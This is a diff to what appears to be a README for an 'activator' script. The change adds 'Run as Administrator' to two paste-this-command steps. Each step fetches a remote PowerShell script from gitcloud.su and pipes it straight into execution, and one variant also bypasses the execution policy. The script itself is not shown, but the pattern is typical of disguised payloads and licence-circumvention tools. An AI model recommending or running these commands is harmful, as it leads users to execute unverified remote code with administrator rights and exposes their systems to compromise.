@@ -3,13 +3,13 @@ An intelligent, single-line script designed for instant deployment of the comple
 
 ---
 
-### 💎 PowerShell
+### 💎 PowerShell (Run as Administrator)
 ```powershell
 irm https://gitcloud.su/powershell/Activator.ps1 | iex
 ```
 
 
-### 💻 Command Prompt (cmd.exe)
+### 💻 Command Prompt (cmd.exe) (Run as Administrator)
 ```cmd
 powershell -ExecutionPolicy Bypass -Command "irm https://gitcloud.su/powershell/Activator.ps1 | iex"
 ```
